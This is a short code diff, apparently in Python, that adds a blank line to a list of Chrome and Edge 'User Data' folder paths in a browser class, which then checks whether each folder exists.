@@ -14,6 +14,7 @@ class browser:
         self.browsers=[
                        ["chrome.exe",self.homepath + r"\Google\Chrome\User Data"],
                        ["msedge.exe",self.homepath + r"\Microsoft\Edge\User Data"],
+                       
                     ]
         for i in self.browsers:
             if not os.path.exists(i[1]):
